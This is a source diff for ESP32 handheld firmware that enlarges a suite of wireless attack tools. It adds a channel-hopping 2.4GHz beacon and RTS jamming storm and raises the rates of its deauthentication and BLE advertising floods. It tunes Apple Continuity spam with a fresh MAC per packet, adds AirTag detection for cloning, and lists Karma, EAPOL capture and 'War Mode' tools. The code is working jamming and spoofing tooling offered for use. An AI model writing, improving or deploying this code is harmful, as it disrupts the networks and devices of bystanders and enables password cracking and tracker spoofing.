@@ -63,6 +63,17 @@ static void jamUpdate();
 static void spoofUpdate();
 static void airSpoofUpdate();
 static void clientQDrain();
+static void menuEnsureVisible(int sel, int& top, int count, int rows = 5) {
+  if (count <= 0) { top = 0; return; }
+  if (sel < top) top = sel;
+  if (sel >= top + rows) top = sel - rows + 1;
+  if (top < 0) top = 0;
+  if (top > 0 && top + rows > count) {
+    top = count - rows;
+    if (top < 0) top = 0;
+  }
+}
+
 
 // ---- Radio ownership mutex (Wave 1) ----
 enum RadioOwner : uint8_t {
@@ -151,13 +162,14 @@ static const uint8_t WEB_AP_CHANNEL = 1;
 static bool webSafeActive() { return webMode; }
 
 static uint8_t wifiTxChannel(uint8_t preferred) {
-  if (webSafeActive()) return WEB_AP_CHANNEL;
+  // Handheld: always use real target channel. Soft-AP web still pins CH1.
+  if (webMode) return WEB_AP_CHANNEL;
   if (preferred < 1 || preferred > 13) return 1;
   return preferred;
 }
 
 static void wifiStayOnApChannel() {
-  if (webSafeActive())
+  if (webMode)
     esp_wifi_set_channel(WEB_AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
 }
 
@@ -516,7 +528,8 @@ static void floodBuildAuth(const uint8_t* ap, const uint8_t* sta) {
 }
 
 static void floodStart(int apIdx, uint8_t mode) {
-  if (apIdx < 0 || apIdx >= 96) return;  // WIFI_MAX_NETS; wifiCount checked in update
+  // apIdx < 0 or mode==3 => full-band Negator-style storm
+  if (mode != 3 && (apIdx < 0 || apIdx >= 96)) return;
   floodTarget = apIdx;
   floodMode = mode;
   floodRunning = true;
@@ -526,6 +539,11 @@ static void floodStart(int apIdx, uint8_t mode) {
   floodStickySta[0] = (floodStickySta[0] | 0x02) & 0xFE;
   floodStickyInit = true;
   radioAcquire(RADIO_WIFI_TX);
+  // Handheld jam: pure AP interface, max power, no Soft-AP if not web
+  if (!webMode) {
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP("t", nullptr, 1, 1, 0);
+  }
   typhoonApplyWarRadio();
   typhoonMaxWifiTx();
 }
@@ -544,18 +562,23 @@ static void floodUpdate() {
 // Dual-core workers
 static void wifiCoreLoop(void* arg) {
   for (;;) {
-    // Wave 1: only run active tools (no empty always-on work)
-    if (deauthRunning || probeRunning || beaconRunning || karmaRunning ||
-        floodRunning || eapolRunning) {
+    // Option C: Wi-Fi TX on this core; UI on the other. Always yield 1 tick.
+    if (floodRunning) {
+      // Jam path: one full burst per schedule, then vTaskDelay(1)
+      floodUpdate();
+      clientQDrain();
+      vTaskDelay(1);
+      continue;
+    }
+    if (deauthRunning || probeRunning || beaconRunning || karmaRunning || eapolRunning) {
       if (deauthRunning) deauthUpdate();
       if (probeRunning) probeUpdate();
       if (beaconRunning) beaconUpdate();
       if (karmaRunning) karmaUpdate();
-      if (floodRunning) floodUpdate();
       if (eapolRunning) eapolUpdate();
     }
     clientQDrain();
-    vTaskDelay(1);
+    vTaskDelay(1);  // ~1ms yield — keeps UI core responsive
   }
 }
 
@@ -603,6 +626,7 @@ struct WifiNet {
 
 static WifiNet  wifiNets[WIFI_MAX_NETS];
 static int      wifiCount = 0;
+static bool     wifiScanDetail = false;
 static bool     wifiScanning = false;
 
 static void wifiScanBegin() {
@@ -621,14 +645,26 @@ static void wifiScanBegin() {
 
 static void wifiScanStart() {
   if (wifiScanning) return;
-  if (!radioAcquire(RADIO_WIFI_SCAN)) {
-    // Attack holds radio — still try scan (best effort)
+  // Stop TX tools that block scan
+  deauthStop(); probeStop(); beaconStop(); floodStop(); karmaStop();
+  radioAcquire(RADIO_WIFI_SCAN);
+  // Handheld: STA mode required for scanNetworks to work (AP-only mode returns empty)
+  if (!webMode) {
+    esp_wifi_set_promiscuous(false);
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect(false);
+    radioSettleRequest(15);
+  } else {
+    WiFi.mode(WIFI_AP_STA);
   }
   wifiScanning = true;
+  wifiCount = 0;
   WiFi.scanDelete();
-  int r = WiFi.scanNetworks(true, true);
+  int r = WiFi.scanNetworks(true /*async*/, true /*hidden*/);
   if (r == WIFI_SCAN_FAILED) {
     wifiScanning = false;
+    radioRelease(RADIO_WIFI_SCAN);
   }
 }
 
@@ -1281,8 +1317,8 @@ static void deauthTx(const uint8_t* frame) {
 }
 
 static void deauthRestoreWebCh() {
-  // Web-safe: always hold Soft-AP channel; never leave it during web mode
-  if (webSafeActive()) wifiStayOnApChannel();
+  // Only Soft-AP web UI returns to CH1; handheld stays on attack channel
+  if (webMode) wifiStayOnApChannel();
 }
 
 static void deauthUpdate() {
@@ -1323,8 +1359,7 @@ static void deauthUpdate() {
     deauthStop();
     return;
   }
-  // Web-safe: slower cadence so Soft-AP keeps airtime
-  if (millis() - deauthLast < (webSafeActive() ? 12 : 5)) return;
+  if (millis() - deauthLast < (webMode ? 12 : 3)) return;
   deauthLast = millis();
 
   const uint8_t* bssid = wifiNets[deauthTarget].bssid;
@@ -1395,40 +1430,92 @@ static void deauthStartAll() {
 }
 
 
+// Negator-inspired: dense random beacons (noise on channel)
+static void floodSendNoiseBeacon(uint8_t ch) {
+  static uint8_t pkt[128];
+  int o = 0;
+  pkt[o++] = 0x80; pkt[o++] = 0x00;
+  pkt[o++] = 0x00; pkt[o++] = 0x00;
+  for (int i = 0; i < 6; i++) pkt[o++] = 0xFF;
+  uint8_t mac[6];
+  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
+  mac[0] = (mac[0] | 0x02) & 0xFE;
+  memcpy(pkt + o, mac, 6); o += 6;
+  memcpy(pkt + o, mac, 6); o += 6;
+  pkt[o++] = 0x00; pkt[o++] = 0x00;
+  for (int i = 0; i < 8; i++) pkt[o++] = 0x00;
+  pkt[o++] = 0x64; pkt[o++] = 0x00;
+  pkt[o++] = 0x01; pkt[o++] = 0x04;
+  // SSID IE — short random/funny noise name
+  static const char* noiseSsids[] = {
+    "TyphonNoise", "CH_JAM", "....", "Free_WiFi?", "null", "~~", "ESP_FLOOD", "0xDEAD"
+  };
+  const char* ss = noiseSsids[esp_random() % 8];
+  uint8_t sl = (uint8_t)strlen(ss);
+  pkt[o++] = 0x00; pkt[o++] = sl;
+  memcpy(pkt + o, ss, sl); o += sl;
+  pkt[o++] = 0x01; pkt[o++] = 0x08;
+  pkt[o++] = 0x82; pkt[o++] = 0x84; pkt[o++] = 0x8B; pkt[o++] = 0x96;
+  pkt[o++] = 0x0C; pkt[o++] = 0x12; pkt[o++] = 0x18; pkt[o++] = 0x24;
+  pkt[o++] = 0x03; pkt[o++] = 0x01; pkt[o++] = ch;
+  pkt[o++] = 0x32; pkt[o++] = 0x04;
+  pkt[o++] = 0x0C; pkt[o++] = 0x18; pkt[o++] = 0x30; pkt[o++] = 0x60;
+  esp_wifi_80211_tx(WIFI_IF_AP, pkt, o, false);
+  esp_wifi_80211_tx(WIFI_IF_STA, pkt, o, false);
+  floodSent += 2;
+}
+
 static void floodUpdateImpl() {
-  if (!floodRunning || floodTarget < 0) return;
-  if (floodTarget >= wifiCount) { floodStop(); return; }
-  if (millis() - floodLast < 2) return;
+  if (!floodRunning) return;
+  // No millis gate: dual-core Option C paces with vTaskDelay(1) in wifiCoreLoop
   floodLast = millis();
+
+  // Mode 3 = full 2.4GHz beacon storm (Negator-style channel hop)
+  if (floodMode == 3 || floodTarget < 0) {
+    static uint8_t hop = 1;
+    hop = (hop % 13) + 1;
+    esp_wifi_set_channel(hop, WIFI_SECOND_CHAN_NONE);
+    for (int n = 0; n < 8; n++) floodSendNoiseBeacon(hop);
+    // Extra RTS noise on this channel
+    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    uint8_t sta[6];
+    for (int i = 0; i < 6; i++) sta[i] = (uint8_t)esp_random();
+    sta[0] = (sta[0] | 0x02) & 0xFE;
+    floodBuildRts(bcast, sta);
+    for (int i = 0; i < 4; i++) {
+      esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false);
+      floodSent++;
+    }
+    return;
+  }
+
+  if (floodTarget >= wifiCount) { floodStop(); return; }
   uint8_t ch = wifiTxChannel(wifiNets[floodTarget].ch);
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   const uint8_t* bssid = wifiNets[floodTarget].bssid;
-  // Sticky STA for NAV consistency; rotate every 64 bursts
-  if (!floodStickyInit || (floodSent % 64) == 0) {
+  if (!floodStickyInit || (floodSent % 32) == 0) {
     for (int i = 0; i < 6; i++) floodStickySta[i] = (uint8_t)esp_random();
     floodStickySta[0] = (floodStickySta[0] | 0x02) & 0xFE;
     floodStickyInit = true;
   }
   const uint8_t* sta = floodStickySta;
-  // Weighted mix: more RTS than auth when mode==3
   uint8_t mode = floodMode;
-  if (mode == 3) {
-    uint8_t r = (uint8_t)(floodSent % 10);
-    mode = (r < 6) ? 0 : (r < 8) ? 1 : 2;
-  }
   if (mode == 0) {
     floodBuildRts(bssid, sta);
-    for (int i = 0; i < 6; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false); floodSent++; }
+    for (int i = 0; i < 8; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false); floodSent++; }
+    for (int n = 0; n < 3; n++) floodSendNoiseBeacon(ch);
   } else if (mode == 1) {
     floodBuildRts(sta, bssid);
     floodPkt[0] = 0xC4;
     floodPkt[2] = 0xD0; floodPkt[3] = 0x02;
-    for (int i = 0; i < 4; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 10, false); floodSent++; }
+    for (int i = 0; i < 6; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 10, false); floodSent++; }
   } else {
     floodBuildAuth(bssid, sta);
-    for (int i = 0; i < 3; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 30, false); floodSent++; }
+    for (int i = 0; i < 5; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 30, false); floodSent++; }
+    for (int n = 0; n < 2; n++) floodSendNoiseBeacon(ch);
   }
-  if (webSafeActive()) wifiStayOnApChannel();
+  // handheld: stay on target channel (no CH1 bounce)
+  if (webMode) wifiStayOnApChannel();
 }
 
 //  Probe Flood – directed stress-test against one AP
@@ -1520,7 +1607,7 @@ static void probeUpdate() {
     esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
     probeSent++;
   }
-  if (webSafeActive()) wifiStayOnApChannel();
+  if (webMode) wifiStayOnApChannel();
 }
 
 // ============================================================
@@ -1676,6 +1763,8 @@ struct BleDev {
   uint8_t mfgLen;
   uint8_t adv[62];
   uint8_t advLen;
+  bool    isApple;
+  bool    isAirTagLike;
 };
 
 static BleDev   bleDevs[BLE_MAX_DEVS];
@@ -1754,6 +1843,19 @@ static bool bleInitBluedroid() {
   return bleReady;
 }
 
+
+static void bleSortByRssi() {
+  for (int i = 0; i < bleCount - 1; i++) {
+    for (int j = i + 1; j < bleCount; j++) {
+      if (bleDevs[j].rssi > bleDevs[i].rssi) {
+        BleDev t = bleDevs[i];
+        bleDevs[i] = bleDevs[j];
+        bleDevs[j] = t;
+      }
+    }
+  }
+}
+
 static void bleProcessAdv(uint8_t *bda, int rssi, uint8_t *payload, uint8_t plen) {
   char addrStr[18];
   bleMacToStr(bda, addrStr, sizeof(addrStr));
@@ -1771,6 +1873,8 @@ static void bleProcessAdv(uint8_t *bda, int rssi, uint8_t *payload, uint8_t plen
     bleDevs[idx].randomized = bleIsRandomizedMac(addr);
     bleDevs[idx].mfgLen = 0;
     bleDevs[idx].advLen = 0;
+    bleDevs[idx].isApple = false;
+    bleDevs[idx].isAirTagLike = false;
     bleNewThisScan++;
   }
   bleDevs[idx].rssi = rssi;
@@ -1808,6 +1912,17 @@ static void bleProcessAdv(uint8_t *bda, int rssi, uint8_t *payload, uint8_t plen
     bleDevs[idx].macChanges++;
     if (bleDevs[idx].macChanges > 6) bleDevs[idx].suspicious = true;
   }
+
+  // Apple company ID 4C:00 in mfg or ADV
+  if (bleDevs[idx].mfgLen >= 2 && bleDevs[idx].mfg[0] == 0x4C && bleDevs[idx].mfg[1] == 0x00)
+    bleDevs[idx].isApple = true;
+  for (int k = 0; k + 3 < (int)plen; k++) {
+    if (payload[k] == 0x4C && payload[k+1] == 0x00) bleDevs[idx].isApple = true;
+    if (payload[k] == 0x12 && payload[k+1] == 0x19) bleDevs[idx].isAirTagLike = true;
+    if (payload[k] == 0x1E && payload[k+1] == 0xFF && k + 3 < plen &&
+        payload[k+2] == 0x4C && payload[k+3] == 0x00) bleDevs[idx].isAirTagLike = true;
+  }
+
 }
 
 static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
@@ -1832,7 +1947,7 @@ static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param
 
 static esp_ble_scan_params_t bleScanParams = {
   .scan_type = BLE_SCAN_TYPE_ACTIVE,
-  .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
+  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
   .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
   .scan_interval = 0x50,
   .scan_window = 0x30,
@@ -1842,25 +1957,29 @@ static esp_ble_scan_params_t bleScanParams = {
 static void airSpoofStop();
 static void bleScanStart() {
   if (bleScanning) return;
-  // Wave 1 A7: pause ADV tools for clean scan
   if (sourRunning) sourStop();
   if (jamRunning) jamStop();
   if (spoofRunning) spoofStop();
   if (airSpoofRunning) airSpoofStop();
   radioAcquire(RADIO_BLE_SCAN);
   bleInit();
-  if (!bleReady) return;
+  if (!bleReady) {
+    radioRelease(RADIO_BLE_SCAN);
+    return;
+  }
+  esp_ble_gap_stop_advertising();
+  bleCount = 0;
   bleNewThisScan = 0;
   bleScanDone = false;
   bleScanning = true;
   bleScanStartedAt = millis();
   esp_ble_gap_set_scan_params(&bleScanParams);
-  esp_ble_gap_start_scanning(5);  // seconds
+  esp_ble_gap_start_scanning(12);  // seconds
 }
 
 static void bleScanUpdate() {
   if (!bleScanning && !bleScanDone) return;
-  if (bleScanning && (millis() - bleScanStartedAt > 8000)) {
+  if (bleScanning && (millis() - bleScanStartedAt > 12000)) {
     esp_ble_gap_stop_scanning();
     bleScanning = false;
     bleScanDone = true;
@@ -1868,6 +1987,7 @@ static void bleScanUpdate() {
   if (!bleScanDone) return;
   bleScanDone = false;
   radioRelease(RADIO_BLE_SCAN);
+  bleSortByRssi();
 
   bleSuspicious = 0;
   for (int i = 0; i < bleCount; i++)
@@ -1924,6 +2044,7 @@ static uint8_t spoofIdx = 0;
 static int spoofNameIdx = 0;
 static uint32_t spoofLast = 0;
 static uint8_t spoofMode = 0;
+static int spoofDevIdx = -1;  // handheld: selected BLE dev for clone/adv
 static uint8_t spoofPower = 9;
 static uint16_t spoofInterval = 32;
 static String  spoofCustomName = "ESP32-TYPHON";
@@ -2006,8 +2127,12 @@ static void spoofUpdate() {
     const char* nm = spoofNames[spoofIdx % SPOOF_COUNT];
     if (spoofMode == 5 && spoofCustomName.length() > 0) nm = spoofCustomName.c_str();
     else if (spoofMode == 4 && bleCount > 0) {
-      nm = bleDevs[spoofNameIdx % bleCount].name.c_str();
-      spoofNameIdx = (spoofNameIdx + 1) % bleCount;
+      if (spoofDevIdx >= 0 && spoofDevIdx < bleCount)
+        nm = bleDevs[spoofDevIdx].name.c_str();
+      else {
+        nm = bleDevs[spoofNameIdx % bleCount].name.c_str();
+        spoofNameIdx = (spoofNameIdx + 1) % bleCount;
+      }
     } else {
       spoofIdx = (spoofIdx + 1) % SPOOF_COUNT;
     }
@@ -2047,10 +2172,13 @@ static uint32_t jamLast = 0;
 static uint32_t jamCount = 0;
 
 static void jamStart() {
-  sniffStop();
+  sniffStop(); spoofStop(); sourStop(); airSpoofStop();
+  if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
   radioAcquire(RADIO_BLE_ADV);
   bleInit();
-  if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
+  if (!bleReady) return;
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
   jamRunning = true;
   jamLast = 0;
   jamCount = 0;
@@ -2065,50 +2193,62 @@ static void jamStop() {
 
 static void jamUpdate() {
   if (!jamRunning) return;
-  if (millis() - jamLast < 8) return;
+  // Max BLE ADV pollution: minimum spacing, all 3 ADV channels via stack
+  if (millis() - jamLast < 4) return;
   jamLast = millis();
   jamCount++;
   if (!bleReady) { bleInit(); if (!bleReady) return; }
 
   uint8_t raw[31];
-  int plen = 16;
-  uint8_t kind = (uint8_t)(jamCount % 6);
+  int plen = 31;
+  uint8_t kind = (uint8_t)(jamCount % 8);
+  // Dense rotating templates (Apple / Samsung / Google / random mfg)
   if (kind == 0) {
-    raw[0] = 0x1E; raw[1] = 0xFF; raw[2] = 0x4C; raw[3] = 0x00;
-    for (int i = 4; i < 31; i++) raw[i] = (uint8_t)esp_random();
-    plen = 31;
+    raw[0]=0x1E; raw[1]=0xFF; raw[2]=0x4C; raw[3]=0x00; raw[4]=0x07; raw[5]=0x19;
+    for (int i=6;i<31;i++) raw[i]=(uint8_t)esp_random();
+    plen=31;
   } else if (kind == 1) {
-    raw[0] = 0x0F; raw[1] = 0xFF; raw[2] = 0x75; raw[3] = 0x00;
-    for (int i = 4; i < 16; i++) raw[i] = (uint8_t)esp_random();
-    plen = 16;
+    raw[0]=0x1E; raw[1]=0xFF; raw[2]=0x4C; raw[3]=0x00; raw[4]=0x0F; raw[5]=0x05; raw[6]=0xC0;
+    for (int i=7;i<31;i++) raw[i]=(uint8_t)esp_random();
+    plen=31;
   } else if (kind == 2) {
-    memcpy(raw, GOOGLE_ADV_TEMPLATE, 14);
-    for (int i = 8; i < 14; i++) raw[i] = (uint8_t)esp_random();
-    plen = 14;
+    raw[0]=0x0F; raw[1]=0xFF; raw[2]=0x75; raw[3]=0x00;
+    for (int i=4;i<16;i++) raw[i]=(uint8_t)esp_random();
+    plen=16;
   } else if (kind == 3) {
-    raw[0] = 0x1E; raw[1] = 0xFF; raw[2] = 0x06; raw[3] = 0x00;
-    for (int i = 4; i < 31; i++) raw[i] = (uint8_t)esp_random();
-    plen = 31;
+    memcpy(raw, GOOGLE_ADV_TEMPLATE, 14);
+    for (int i=8;i<14;i++) raw[i]=(uint8_t)esp_random();
+    plen=14;
   } else if (kind == 4) {
-    raw[0] = 0x02; raw[1] = 0x01; raw[2] = 0x06;
-    raw[3] = 0x03; raw[4] = 0x03; raw[5] = 0x2C; raw[6] = 0xFE;
-    for (int i = 7; i < 20; i++) raw[i] = (uint8_t)esp_random();
-    plen = 20;
+    raw[0]=0x1E; raw[1]=0xFF; raw[2]=0x06; raw[3]=0x00;
+    for (int i=4;i<31;i++) raw[i]=(uint8_t)esp_random();
+    plen=31;
+  } else if (kind == 5) {
+    // Flags + complete local name spam
+    const char* nm = "XXXXXX";
+    raw[0]=0x02; raw[1]=0x01; raw[2]=0x06;
+    raw[3]=0x07; raw[4]=0x09;
+    for (int i=0;i<6;i++) raw[5+i]=(uint8_t)('A'+(esp_random()%26));
+    plen=11;
+  } else if (kind == 6) {
+    raw[0]=0x02; raw[1]=0x01; raw[2]=0x1A;
+    raw[3]=0x1B; raw[4]=0xFF;
+    for (int i=5;i<31;i++) raw[i]=(uint8_t)esp_random();
+    plen=31;
   } else {
-    raw[0] = 0x1A; raw[1] = 0xFF;
-    for (int i = 2; i < 27; i++) raw[i] = (uint8_t)esp_random();
-    plen = 27;
+    for (int i=0;i<31;i++) raw[i]=(uint8_t)esp_random();
+    raw[0]=0x1E; raw[1]=0xFF;
+    plen=31;
   }
 
-  {
-    esp_bd_addr_t mac;
-    mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
-    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
-    esp_ble_gap_set_rand_addr(mac);
-  }
+  esp_bd_addr_t mac;
+  mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
+  for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
+  esp_ble_gap_set_rand_addr(mac);
 
   bleAdvParams.adv_int_min = 0x10;
-  bleAdvParams.adv_int_max = 0x14;
+  bleAdvParams.adv_int_max = 0x10;
+  bleAdvParams.channel_map = ADV_CHNL_ALL;
   esp_ble_gap_config_adv_data_raw(raw, plen);
   esp_ble_gap_start_advertising(&bleAdvParams);
 }
@@ -2159,8 +2299,8 @@ static uint32_t sourLast = 0;
 static uint32_t sourSent = 0;
 
 static esp_ble_adv_params_t sourAdvParams = {
-  .adv_int_min = 0x20,
-  .adv_int_max = 0x40,
+  .adv_int_min = 0x15,
+  .adv_int_max = 0x25,
   .adv_type = ADV_TYPE_NONCONN_IND,
   .own_addr_type = BLE_ADDR_TYPE_RANDOM,
   .channel_map = ADV_CHNL_ALL,
@@ -2205,19 +2345,21 @@ static void sourStop() {
   radioRelease(RADIO_BLE_ADV);
 }
 
-static uint16_t sourIntervalMs = 12;
+static uint16_t sourIntervalMs = 12;  // Continuity spam cadence (ms)
 
 static void sourBeginAdvertise() {
   sniffStop();
   spoofStop();
   jamStop();
   airTagStop();
+  if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
   radioAcquire(RADIO_BLE_ADV);
   bleInit();
   if (!bleReady) { sourRunning = false; radioRelease(RADIO_BLE_ADV); return; }
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
+  esp_ble_gap_stop_advertising();
   sourRunning = true;
   sourLast = 0;
   sourSent = 0;
@@ -2235,10 +2377,10 @@ static void sourUpdate() {
     idx = (int)(esp_random() % APPLE_LIST_COUNT);
   const AppleType& t = appleList[idx];
 
-  // New random static MAC every packet — max identity pressure
+  // New random static MAC every packet (top bits 11)
   {
     esp_bd_addr_t mac;
-    mac[0] = (uint8_t)((esp_random() & 0xFF) | 0xC0);
+    mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
     for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
     esp_ble_gap_set_rand_addr(mac);
   }
@@ -2246,6 +2388,7 @@ static void sourUpdate() {
   uint8_t packet[31];
   uint8_t plen = 0;
   sourBuildPacket(packet, &plen, t);
+  if (plen < 4) return;
 
   esp_ble_gap_config_adv_data_raw(packet, plen);
   esp_ble_gap_start_advertising(&sourAdvParams);
@@ -2312,10 +2455,10 @@ static void airTagSortByRssi() {
 static void airDetHarvestFromBleList() {
   uint32_t now = millis();
   for (int i = 0; i < bleCount; i++) {
-    bool match = false;
+    bool match = bleDevs[i].isAirTagLike;
     uint8_t buf[62];
     uint8_t blen = 0;
-    // Wave 1: prefer full ADV blob (nyanBOX-style)
+    // Prefer full ADV blob for clone fidelity
     if (bleDevs[i].advLen >= 4) {
       blen = bleDevs[i].advLen;
       memcpy(buf, bleDevs[i].adv, blen);
@@ -2395,7 +2538,8 @@ static void airDetUpdate() {
     airDetLast = millis();
     return;
   }
-  if (millis() - airDetLast > 2000) {
+  // Faster rescan while hunting AirTags
+  if (millis() - airDetLast > 1500) {
     bleScanStart();
     airDetScanning = true;
     airDetLast = millis();
@@ -2415,8 +2559,8 @@ static bool parseMacStr(const char* s, uint8_t out[6]) {
 }
 
 static esp_ble_adv_params_t airAdvParams = {
-  .adv_int_min = 0x20,
-  .adv_int_max = 0x40,
+  .adv_int_min = 0x15,
+  .adv_int_max = 0x25,
   .adv_type = ADV_TYPE_NONCONN_IND,
   .own_addr_type = BLE_ADDR_TYPE_RANDOM,
   .channel_map = ADV_CHNL_ALL,
@@ -2453,7 +2597,7 @@ static void airSpoofStart(int targetIdx) {
 static void airSpoofUpdate() {
   if (!airSpoofRunning) return;
   if (airTagCount <= 0) { airSpoofStop(); return; }
-  if (millis() - airSpoofLast < 20) return;
+  if (millis() - airSpoofLast < 15) return;
   airSpoofLast = millis();
   airTagSent++;
   bleInit();
@@ -3655,18 +3799,22 @@ static void handleWebClients() {
 
 UI ui;
 
-const char* const UI::MAIN_ITEMS[] = { "Wi-Fi Tools", "Bluetooth Tools", "About" };
-const int UI::MAIN_COUNT = 3;
+const char* const UI::MAIN_ITEMS[] = {
+  "Wi-Fi Tools", "Bluetooth Tools", "Stop All Tools", "About"
+};
+const int UI::MAIN_COUNT = 4;
 
 const char* const UI::WIFI_ITEMS[] = {
   "Wi-Fi Scanner", "Packet Monitor", "Beacon Spammer",
-  "Deauth Attack", "Client Sniffer", "Deauth Detector", "Probe Flood", "Captive Portal", "Back"
+  "Deauth Attack", "Client Sniffer", "Deauth Detector",
+  "Probe Flood", "Karma", "WiFi Jammer", "EAPOL Capture",
+  "Captive Portal", "War Mode", "Back"
 };
-const int UI::WIFI_COUNT = 9;
+const int UI::WIFI_COUNT = 13;
 
 const char* const UI::BLE_ITEMS[] = {
   "BLE Scanner", "BLE Sniffer", "BLE Spoofer", "Sour Apple",
-  "BLE ADV Flood", "AirTag Tools", "Back"
+  "BLE Jammer", "AirTag Tools", "Back"
 };
 const int UI::BLE_COUNT = 7;
 
@@ -3689,18 +3837,23 @@ void UI::begin() {
 }
 
 void UI::enterScreen(Screen s) {
-  pmStop(); beaconStop(); detStop(); deauthStop(); clientSniffStop(); probeStop(); captiveStop();
+  pmStop(); beaconStop(); detStop(); deauthStop(); clientSniffStop(); probeStop();
+  karmaStop(); floodStop(); eapolStop(); captiveStop();
   sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
 
   _screen = s;
   _sel = 0; _top = 0; _dirty = true;
 
-  if (s == SCR_WIFI_SCAN)  wifiScanStart();
+  if (s == SCR_WIFI_SCAN)  { wifiScanDetail = false; wifiScanStart(); }
   if (s == SCR_BLE_SCAN)   bleScanStart();
   if (s == SCR_PACKET_MON) pmStart();
   if (s == SCR_BEACON)     { beaconStop(); }
   if (s == SCR_DEAUTH_DET) detStart();
   if (s == SCR_PROBE)      { probeStop(); }
+  if (s == SCR_KARMA)      { karmaStop(); }
+  if (s == SCR_FLOOD)      { floodStop(); }
+  if (s == SCR_EAPOL)      { eapolStop(); }
+  if (s == SCR_WAR)        { /* toggle screen */ }
   if (s == SCR_CAPTIVE)    captiveStart();
   if (s == SCR_BLE_SNIFF)  sniffStart();
   if (s == SCR_BLE_SPOOF)  { spoofStop(); }
@@ -3714,6 +3867,7 @@ void UI::enterScreen(Screen s) {
 }
 
 void UI::goBack() {
+  wifiScanDetail = false;
   pmStop(); beaconStop(); detStop(); deauthStop(); clientSniffStop(); probeStop(); captiveStop();
   sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
 
@@ -3721,7 +3875,8 @@ void UI::goBack() {
     case SCR_WIFI_MENU: case SCR_BLE_MENU: case SCR_ABOUT:
       enterScreen(SCR_MAIN); break;
     case SCR_WIFI_SCAN: case SCR_PACKET_MON: case SCR_BEACON:
-    case SCR_DEAUTH: case SCR_CLIENT_SNIFF: case SCR_DEAUTH_DET: case SCR_PROBE: case SCR_CAPTIVE:
+    case SCR_DEAUTH: case SCR_CLIENT_SNIFF: case SCR_DEAUTH_DET: case SCR_PROBE:
+    case SCR_KARMA: case SCR_FLOOD: case SCR_EAPOL: case SCR_WAR: case SCR_CAPTIVE:
       enterScreen(SCR_WIFI_MENU); break;
     case SCR_BLE_SCAN: case SCR_BLE_SNIFF: case SCR_BLE_SPOOF:
     case SCR_SOUR_APPLE: case SCR_BLE_JAM: case SCR_AIRTAG:
@@ -3734,31 +3889,53 @@ void UI::goBack() {
 void UI::handleInput(JoyAction a) {
   if (a == JOY_NONE) return;
 
-  // WiFi Scanner
+  // WiFi Scanner: short=details, 1s hold=refresh, 2s hold=back
   if (_screen == SCR_WIFI_SCAN) {
-    int cnt = wifiScanning ? 0 : wifiCount;
-    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; if (_top > _sel) _top = _sel; }
+    if (wifiScanDetail) {
+      if (a == JOY_BACK || a == JOY_BACK2 || a == JOY_SELECT) {
+        wifiScanDetail = false;
+        _dirty = true;
+      }
+      return;
+    }
+    int cnt = wifiCount;
+    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; menuEnsureVisible(_sel, _top, cnt, 6); }
     if (a == JOY_UP || a == JOY_HOLD_UP) {
-      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
+      if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
     } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
-      if (cnt > 0 && _sel < cnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
+      if (cnt > 0 && _sel < cnt - 1) { _sel++; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
     } else if (a == JOY_SELECT) {
-      if (!wifiScanning) { wifiScanStart(); _sel = 0; _top = 0; _dirty = true; }
-    } else if (a == JOY_BACK) goBack();
+      // Open detail for selected network (do not refresh)
+      if (!wifiScanning && cnt > 0 && _sel >= 0 && _sel < cnt) {
+        wifiScanDetail = true;
+        _dirty = true;
+      }
+    } else if (a == JOY_BACK) {
+      // 1s hold = refresh scan
+      if (!wifiScanning) {
+        wifiScanStart();
+        _sel = 0; _top = 0;
+        wifiScanDetail = false;
+        _dirty = true;
+      }
+    } else if (a == JOY_BACK2) {
+      wifiScanDetail = false;
+      goBack();
+    }
     return;
   }
 
   // BLE Scanner
   if (_screen == SCR_BLE_SCAN) {
